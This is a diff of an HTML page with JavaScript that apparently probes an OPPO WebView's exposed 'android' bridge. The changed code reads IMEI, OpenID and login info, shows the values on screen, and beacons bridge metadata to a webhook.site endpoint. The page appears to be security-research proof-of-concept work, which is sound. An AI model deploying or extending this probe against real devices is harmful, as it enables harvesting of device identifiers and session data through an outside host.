@@ -2,38 +2,37 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Active Probe</title>
+  <title>OPPO WebBridge Full Local Sensitive Probe</title>
   <style>
     body { font-family: sans-serif; padding: 24px; }
     pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
+    .warn { color: #b00020; font-weight: bold; }
     button { padding: 10px 16px; margin: 8px 0; }
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge Active Probe</h1>
+<h1>OPPO WebBridge Full Local Sensitive Probe</h1>
+<p class="warn">
+  Full sensitive values are displayed locally on this device only.
+  Webhook receives only metadata, not raw IMEI/OpenID/LoginInfo.
+</p>
 <p id="status">WAITING</p>
-<button onclick="runProbe('manual_button')">Run active probe again</button>
+<button onclick="runProbe('manual_button')">Run full local sensitive probe again</button>
 <pre id="out"></pre>
 
 <script>
 (function () {
   const WEBHOOK = "https://webhook.site/c9351bd1-51a3-45c3-a3d0-936fd40c67b3";
 
-  const SAFE_METHODS = [
-    "getPackageName",
-    "getRomVersion",
-    "getRomVersionCode",
-    "getPhoneBrand",
-    "getDeviceModel",
-    "getNetworkType",
-    "getStatusBarHeight",
-    "isSupportShake"
+  const READONLY_SENSITIVE_METHODS = [
+    "getImei",
+    "getOpenId",
+    "getLoginInfo",
+    "isLogin",
+    "getChannelId"
   ];
 
   const DO_NOT_CALL = [
-    "getImei",
-    "getLoginInfo",
-    "getOpenId",
     "startPay",
     "downloadGameByPackageName",
     "clipboardText",
@@ -65,165 +64,126 @@
     }
   }
 
-  function describeObject(name, obj) {
-    const r = {
-      name,
-      type: typeof obj,
-      tag: null,
-      ownKeys: [],
-      functionKeys: [],
-      valuePreview: null,
-      error: null
+  function metadataOnly(v) {
+    const s = safeString(v);
+    return {
+      empty: s.length === 0 || s === "undefined" || s === "null",
+      length: s.length,
+      typePreview: s === "undefined" || s === "null" ? s : "non-empty-value-not-sent-to-webhook"
     };
-
-    try { r.tag = Object.prototype.toString.call(obj); } catch (e) { r.tag = "tag_error:" + e; }
-
-    try {
-      r.ownKeys = Object.getOwnPropertyNames(obj).slice(0, 120);
-      r.functionKeys = r.ownKeys.filter(k => {
-        try { return typeof obj[k] === "function"; } catch (e) { return false; }
-      });
-    } catch (e) {
-      r.error = "keys_error:" + e;
-    }
-
-    try {
-      if (typeof obj !== "object" && typeof obj !== "function") {
-        r.valuePreview = String(obj);
-      }
-    } catch (e) {}
-
-    return r;
   }
 
-  function callSafeAndroidMethods() {
-    const results = [];
+  function callReadonlySensitiveMethods() {
+    const localResults = [];
+    const webhookResults = [];
     const a = window.android;
 
     if (!a || typeof a !== "object") {
-      return [{ method: "__android_missing__", ok: false, error: "window.android is not object" }];
+      return {
+        localResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }],
+        webhookResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }]
+      };
     }
 
-    for (const m of SAFE_METHODS) {
-      const item = { method: m, exists: false, ok: false, returnType: null, returnValue: null, error: null };
+    for (const m of READONLY_SENSITIVE_METHODS) {
+      const localItem = {
+        method: m,
+        exists: false,
+        ok: false,
+        returnType: null,
+        rawReturnValue_LOCAL_ONLY: null,
+        error: null
+      };
+
+      const webhookItem = {
+        method: m,
+        exists: false,
+        ok: false,
+        returnType: null,
+        metadataOnly: null,
+        rawValueSentToWebhook: false,
+        error: null
+      };
+
       try {
-        item.exists = typeof a[m] === "function";
-        if (!item.exists) {
-          item.error = "missing_or_not_function";
+        const exists = typeof a[m] === "function";
+        localItem.exists = exists;
+        webhookItem.exists = exists;
+
+        if (!exists) {
+          localItem.error = "missing_or_not_function";
+          webhookItem.error = "missing_or_not_function";
         } else {
           const ret = a[m]();
-          item.ok = true;
-          item.returnType = typeof ret;
-          item.returnValue = safeString(ret).slice(0, 500);
+
+          localItem.ok = true;
+          localItem.returnType = typeof ret;
+          localItem.rawReturnValue_LOCAL_ONLY = safeString(ret);
+
+          webhookItem.ok = true;
+          webhookItem.returnType = typeof ret;
+          webhookItem.metadataOnly = metadataOnly(ret);
         }
       } catch (e) {
-        item.error = String(e && (e.stack || e.message || e));
+        const err = String(e && (e.stack || e.message || e));
+        localItem.error = err;
+        webhookItem.error = err;
       }
-      results.push(item);
+
+      localResults.push(localItem);
+      webhookResults.push(webhookItem);
     }
 
     for (const m of DO_NOT_CALL) {
-      results.push({
+      const skipped = {
         method: m,
         skipped: true,
-        reason: "sensitive_or_state_changing_method_not_called"
+        reason: "state_changing_or_high_risk_method_not_called"
+      };
+      localResults.push(skipped);
+      webhookResults.push(skipped);
+    }
+
+    return { localResults, webhookResults };
+  }
+
+  function describeAndroidObject() {
+    const a = window.android;
+    if (!a || typeof a !== "object") {
+      return { exists: false, type: typeof a };
+    }
+
+    let ownKeys = [];
+    let functionKeys = [];
+    try {
+      ownKeys = Object.getOwnPropertyNames(a).slice(0, 120);
+      functionKeys = ownKeys.filter(k => {
+        try { return typeof a[k] === "function"; } catch (e) { return false; }
       });
-    }
+    } catch (e) {}
 
-    return results;
+    return {
+      exists: true,
+      type: typeof a,
+      tag: Object.prototype.toString.call(a),
+      ownKeys,
+      functionKeys
+    };
   }
 
-  function callSafeNonAndroidMethods() {
-    const results = [];
-
-    try {
-      if (window.HeytapTheme && typeof window.HeytapTheme.isNight === "function") {
-        results.push({
-          object: "HeytapTheme",
-          method: "isNight",
-          ok: true,
-          returnValue: safeString(window.HeytapTheme.isNight()).slice(0, 500)
-        });
-      }
-    } catch (e) {
-      results.push({ object: "HeytapTheme", method: "isNight", ok: false, error: String(e) });
-    }
-
-    try {
-      if (window.HeytapTheme && typeof window.HeytapTheme.getDarkConfiguration === "function") {
-        results.push({
-          object: "HeytapTheme",
-          method: "getDarkConfiguration",
-          ok: true,
-          returnValue: safeString(window.HeytapTheme.getDarkConfiguration()).slice(0, 500)
-        });
-      }
-    } catch (e) {
-      results.push({ object: "HeytapTheme", method: "getDarkConfiguration", ok: false, error: String(e) });
-    }
-
-    try {
-      if (window.__perfStatInWebview__ && typeof window.__perfStatInWebview__.getPerfData === "function") {
-        results.push({
-          object: "__perfStatInWebview__",
-          method: "getPerfData",
-          ok: true,
-          returnValue: safeString(window.__perfStatInWebview__.getPerfData()).slice(0, 1000)
-        });
-      }
-    } catch (e) {
-      results.push({ object: "__perfStatInWebview__", method: "getPerfData", ok: false, error: String(e) });
-    }
-
-    return results;
-  }
-
-  function collectPassive() {
-    const names = [
-      "android",
-      "HeytapTheme",
-      "__perfStatInWebview__",
-      "__perfStatInWebview_isReady__",
-      "JSBridge",
-      "jsBridge",
-      "OPPO",
-      "Oppo",
-      "oppo",
-      "HeyTap",
-      "heytap",
-      "GameSpace",
-      "Oaps",
-      "oaps",
-      "Native",
-      "native",
-      "WebViewJavascriptBridge",
-      "JavascriptInterface"
-    ];
-
-    const suspectedObjects = [];
-    for (const n of names) {
-      try {
-        if (typeof window[n] !== "undefined") {
-          suspectedObjects.push(describeObject(n, window[n]));
-        }
-      } catch (e) {
-        suspectedObjects.push({ name: n, error: String(e) });
-      }
-    }
-
-    return suspectedObjects;
-  }
-
-  function sendBeacon(payload) {
+  function sendWebhookMetadata(payload) {
     const json = JSON.stringify(payload);
     const encoded = encodeURIComponent(json);
 
     try {
-      navigator.sendBeacon(WEBHOOK + "/active-bridge-probe-beacon", new Blob([json], { type: "application/json" }));
+      navigator.sendBeacon(
+        WEBHOOK + "/sensitive-localonly-metadata-beacon",
+        new Blob([json], { type: "application/json" })
+      );
     } catch (e) {}
 
     try {
-      fetch(WEBHOOK + "/active-bridge-probe-post", {
+      fetch(WEBHOOK + "/sensitive-localonly-metadata-post", {
         method: "POST",
         mode: "no-cors",
         headers: { "content-type": "application/json" },
@@ -232,16 +192,28 @@
     } catch (e) {}
 
     try {
-      new Image().src = WEBHOOK + "/active-bridge-probe-get?event=ACTIVE_BRIDGE_PROBE_RESULT&t=" + Date.now() + "&d=" + encoded.slice(0, 7000);
+      new Image().src =
+        WEBHOOK +
+        "/sensitive-localonly-metadata-get?event=SENSITIVE_LOCALONLY_METADATA_RESULT&t=" +
+        Date.now() +
+        "&d=" +
+        encoded.slice(0, 7000);
     } catch (e) {}
   }
 
   window.runProbe = function(reason) {
-    const result = {
-      eventType: "ACTIVE_BRIDGE_PROBE_RESULT",
-      version: "active_probe_v1_safe_methods_only",
+    const called = callReadonlySensitiveMethods();
+
+    const localDisplayResult = {
+      eventType: "SENSITIVE_FULL_LOCAL_DISPLAY_RESULT",
+      version: "full_local_display_v1_no_raw_webhook",
       ts: new Date().toISOString(),
       reason,
+      safetyBoundary: {
+        rawSensitiveValuesDisplayedOnDevice: true,
+        rawSensitiveValuesSentToWebhook: false,
+        stateChangingMethodsCalled: false
+      },
       location: {
         href: location.href,
         origin: location.origin,
@@ -253,27 +225,35 @@
         platform: navigator.platform,
         language: navigator.language,
         cookieEnabled: navigator.cookieEnabled,
-        webdriver: navigator.webdriver,
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight
-        },
-        viewport: {
-          innerWidth: innerWidth,
-          innerHeight: innerHeight
-        }
+        webdriver: navigator.webdriver
       },
-      passiveObjects: collectPassive(),
-      androidSafeMethodResults: callSafeAndroidMethods(),
-      nonAndroidSafeMethodResults: callSafeNonAndroidMethods()
+      androidBridge: describeAndroidObject(),
+      readonlySensitiveMethodResults_LOCAL_SCREEN_ONLY: called.localResults
     };
 
-    document.getElementById("status").textContent = "ACTIVE_PROBE_DONE: " + result.ts;
-    document.getElementById("out").textContent = JSON.stringify(result, null, 2);
+    const webhookMetadataResult = {
+      eventType: "SENSITIVE_LOCALONLY_METADATA_RESULT",
+      version: "full_local_display_v1_no_raw_webhook",
+      ts: localDisplayResult.ts,
+      reason,
+      safetyBoundary: {
+        rawSensitiveValuesDisplayedOnDevice: true,
+        rawSensitiveValuesSentToWebhook: false,
+        stateChangingMethodsCalled: false
+      },
+      location: localDisplayResult.location,
+      environment: localDisplayResult.environment,
+      androidBridge: localDisplayResult.androidBridge,
+      readonlySensitiveMethodResults_METADATA_ONLY: called.webhookResults
+    };
 
-    sendBeacon(result);
+    document.getElementById("status").textContent =
+      "SENSITIVE_FULL_LOCAL_DISPLAY_DONE: " + localDisplayResult.ts;
+
+    document.getElementById("out").textContent =
+      JSON.stringify(localDisplayResult, null, 2);
+
+    sendWebhookMetadata(webhookMetadataResult);
   };
 
   setTimeout(function () {
